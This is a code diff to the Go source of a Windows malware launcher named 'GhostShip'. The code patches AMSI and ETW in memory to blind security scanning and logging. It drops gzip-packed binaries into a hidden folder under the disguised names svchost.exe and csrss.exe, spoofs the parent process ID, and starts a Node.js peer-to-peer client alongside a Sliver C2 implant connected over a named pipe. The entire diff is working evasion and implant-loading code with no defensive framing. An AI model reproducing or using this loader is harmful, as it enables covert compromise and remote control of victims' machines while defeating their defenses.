@@ -33,90 +33,126 @@ const (
 	PROCESS_ALL_ACCESS                   = 0x000F0000 | 0x00100000 | 0xFFFF
 )
 
+// Fixed named pipe name - Sliver implant must be generated with:
+// generate --named-pipe \\.\pipe\gspipe --os windows --arch amd64
+const PIPE_NAME = `\\.\pipe\gspipe`
+
 type STARTUPINFOEX struct {
 	windows.StartupInfo
 	lpAttributeList uintptr
 }
 
 func Run(connString string) error {
-	// 1. Initial Delay for Sandbox Evasion
-	time.Sleep(10 * time.Second)
+	fmt.Println("[*] GhostShip Starting...")
 
-	// 2. Telemetry Blinding (AMSI & ETW Patching)
+	// 1. Telemetry Blinding (AMSI & ETW Patching)
 	patchAmsiEtw()
 
-	// 3. Create Hidden Runtime Directory
+	// 2. Create Hidden Runtime Directory
 	localAppData := os.Getenv("LOCALAPPDATA")
 	if localAppData == "" {
 		localAppData = os.Getenv("TEMP")
 	}
-	
+
 	workDir := filepath.Join(localAppData, fmt.Sprintf(".gs-%d", time.Now().UnixNano()))
 	if err := os.MkdirAll(workDir, 0700); err != nil {
 		return fmt.Errorf("failed to create work dir: %w", err)
 	}
 	defer os.RemoveAll(workDir)
 
+	// Set directory as hidden
 	pathPtr, _ := windows.UTF16PtrFromString(workDir)
 	windows.SetFileAttributes(pathPtr, windows.FILE_ATTRIBUTE_HIDDEN)
 
-	// 4. Setup Named Pipe
-	pipeName := fmt.Sprintf(`\\.\pipe\gs-%d`, time.Now().UnixNano())
-
-	// 5. Extract Assets
+	// 3. Extract Assets
 	if err := extractAssets(workDir); err != nil {
-		return err
+		return fmt.Errorf("extract assets failed: %w", err)
 	}
 
-	// 6. Load Binaries
-	nodePath := filepath.Join(workDir, "kworker-0.exe")
+	// 4. Extract Binaries to hidden files
+	nodePath := filepath.Join(workDir, "svchost.exe") // Disguised name
 	if err := loadAssetToFile("node.gz", nodePath); err != nil {
-		return err
+		return fmt.Errorf("load node failed: %w", err)
 	}
-	
-	payloadPath := filepath.Join(workDir, "kworker-1.exe")
+
+	payloadPath := filepath.Join(workDir, "csrss.exe") // Disguised name
 	if err := loadAssetToFile("payload.gz", payloadPath); err != nil {
-		return err
+		return fmt.Errorf("load payload failed: %w", err)
 	}
 
-	// 7. Find Parent Process for Spoofing (svchost.exe)
+	// 5. Find Parent Process for PPID Spoofing
 	ppid, _ := findProcessId("svchost.exe")
-
-	// 8. Start Processes with PPID Spoofing
-	fmt.Printf("[*] Spawning processes with PPID Spoofing (Parent PID: %d)...\n", ppid)
-	
-	nodeProc, err := startProcessSpoofed(nodePath, []string{nodePath, filepath.Join(workDir, "client.js"), connString}, workDir, ppid, "GS_NAMED_PIPE="+pipeName)
-	if err != nil {
-		return fmt.Errorf("failed to start node with spoofing: %w", err)
+	if ppid == 0 {
+		ppid, _ = findProcessId("explorer.exe")
 	}
 
-	payloadProc, err := startProcessSpoofed(payloadPath, []string{payloadPath}, workDir, ppid, "SLIVER_NAMED_PIPE="+pipeName)
+	fmt.Printf("[*] PPID Spoofing target: %d\n", ppid)
+
+	// 6. Start Node.js P2P Client
+	// Pass named pipe path and connection string
+	nodeArgs := []string{
+		nodePath,
+		filepath.Join(workDir, "client.js"),
+		connString,
+	}
+	nodeEnv := fmt.Sprintf("GS_NAMED_PIPE=%s", PIPE_NAME)
+
+	nodeProc, err := startProcessSpoofed(nodePath, nodeArgs, workDir, ppid, nodeEnv)
+	if err != nil {
+		return fmt.Errorf("failed to start node: %w", err)
+	}
+
+	// Give Node.js time to create the named pipe server
+	time.Sleep(3 * time.Second)
+
+	// 7. Start Sliver Payload
+	// Sliver was generated with --named-pipe \\.\pipe\gspipe
+	// It will connect to that pipe automatically
+	payloadArgs := []string{payloadPath}
+	payloadEnv := "" // Sliver doesn't need env vars, pipe is hardcoded
+
+	payloadProc, err := startProcessSpoofed(payloadPath, payloadArgs, workDir, ppid, payloadEnv)
 	if err != nil {
 		windows.TerminateProcess(nodeProc, 0)
-		return fmt.Errorf("failed to start payload with spoofing: %w", err)
+		return fmt.Errorf("failed to start payload: %w", err)
 	}
 
-	// 9. Wait for completion
-	windows.WaitForSingleObject(nodeProc, windows.INFINITE)
-	windows.WaitForSingleObject(payloadProc, windows.INFINITE)
+	fmt.Println("[+] All components started")
 
+	// 8. Wait for either process to exit
+	handles := []windows.Handle{nodeProc, payloadProc}
+	event, _ := windows.WaitForMultipleObjects(handles, false, windows.INFINITE)
+
+	// Cleanup: terminate both processes
+	windows.TerminateProcess(nodeProc, 0)
+	windows.TerminateProcess(payloadProc, 0)
 	windows.CloseHandle(nodeProc)
 	windows.CloseHandle(payloadProc)
+
+	if event == windows.WAIT_OBJECT_0 {
+		fmt.Println("[*] Node.js exited first")
+	} else {
+		fmt.Println("[*] Payload exited first")
+	}
 
 	return nil
 }
 
 func patchAmsiEtw() {
-	// AMSI Patch (AmsiScanBuffer -> ret)
+	// AMSI Patch (AmsiScanBuffer -> ret 18h)
+	// Prevents PowerShell/script scanning
 	amsiProc := modamsi.NewProc("AmsiScanBuffer")
 	if amsiProc.Find() == nil {
-		patchMemory(amsiProc.Addr(), []byte{0xC2, 0x18, 0x00}) // ret 18h
+		patchMemory(amsiProc.Addr(), []byte{0xC2, 0x18, 0x00})
+		fmt.Println("[+] AMSI patched")
 	}
 
 	// ETW Patch (EtwEventWrite -> ret)
+	// Prevents event logging
 	etwProc := modntdll.NewProc("EtwEventWrite")
 	if etwProc.Find() == nil {
-		patchMemory(etwProc.Addr(), []byte{0xC3}) // ret
+		patchMemory(etwProc.Addr(), []byte{0xC3})
+		fmt.Println("[+] ETW patched")
 	}
 }
 
@@ -131,7 +167,9 @@ func patchMemory(address uintptr, patch []byte) {
 
 func findProcessId(name string) (uint32, error) {
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
-	if err != nil { return 0, err }
+	if err != nil {
+		return 0, err
+	}
 	defer windows.CloseHandle(snapshot)
 
 	var entry windows.ProcessEntry32
@@ -149,18 +187,19 @@ func findProcessId(name string) (uint32, error) {
 func startProcessSpoofed(path string, args []string, dir string, ppid uint32, env string) (windows.Handle, error) {
 	var si STARTUPINFOEX
 	si.StartupInfo.Cb = uint32(unsafe.Sizeof(si))
-	
+
+	// Setup PPID Spoofing if we have a valid parent
 	if ppid > 0 {
 		hParent, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, ppid)
 		if err == nil {
 			defer windows.CloseHandle(hParent)
-			
+
 			var size uintptr
 			procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)))
-			
+
 			buffer := make([]byte, size)
 			si.lpAttributeList = uintptr(unsafe.Pointer(&buffer[0]))
-			
+
 			procInitializeProcThreadAttributeList.Call(si.lpAttributeList, 1, 0, uintptr(unsafe.Pointer(&size)))
 			procUpdateProcThreadAttribute.Call(
 				si.lpAttributeList,
@@ -177,10 +216,12 @@ func startProcessSpoofed(path string, args []string, dir string, ppid uint32, en
 	var pi windows.ProcessInformation
 	cmdLine, _ := windows.UTF16PtrFromString(strings.Join(args, " "))
 	dirPtr, _ := windows.UTF16PtrFromString(dir)
-	
-	// Environment
+
+	// Build environment block
 	envVars := os.Environ()
-	envVars = append(envVars, env)
+	if env != "" {
+		envVars = append(envVars, env)
+	}
 	var envBlockStr string
 	for _, v := range envVars {
 		envBlockStr += v + "\x00"
@@ -189,13 +230,13 @@ func startProcessSpoofed(path string, args []string, dir string, ppid uint32, en
 	envPtr, _ := windows.UTF16PtrFromString(envBlockStr)
 
 	flags := uint32(CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT)
-	
+
 	r1, _, err := procCreateProcess.Call(
 		0,
 		uintptr(unsafe.Pointer(cmdLine)),
 		0,
 		0,
-		1,
+		1, // bInheritHandles
 		uintptr(flags),
 		uintptr(unsafe.Pointer(envPtr)),
 		uintptr(unsafe.Pointer(dirPtr)),
@@ -206,24 +247,31 @@ func startProcessSpoofed(path string, args []string, dir string, ppid uint32, en
 	if r1 == 0 {
 		return 0, err
 	}
-	
+
 	windows.CloseHandle(pi.Thread)
 	return pi.Process, nil
 }
 
 func loadAssetToFile(assetName, destPath string) error {
 	f, err := Assets.Open("assets/" + assetName)
-	if err != nil { return err }
+	if err != nil {
+		return fmt.Errorf("open asset %s: %w", assetName, err)
+	}
 	defer f.Close()
 
 	gz, err := gzip.NewReader(f)
-	if err != nil { return err }
+	if err != nil {
+		return fmt.Errorf("gzip reader %s: %w", assetName, err)
+	}
 	defer gz.Close()
 
 	out, err := os.Create(destPath)
-	if err != nil { return err }
+	if err != nil {
+		return fmt.Errorf("create file %s: %w", destPath, err)
+	}
 	defer out.Close()
 
+	// Set file as hidden
 	pathPtr, _ := windows.UTF16PtrFromString(destPath)
 	windows.SetFileAttributes(pathPtr, windows.FILE_ATTRIBUTE_HIDDEN)
 
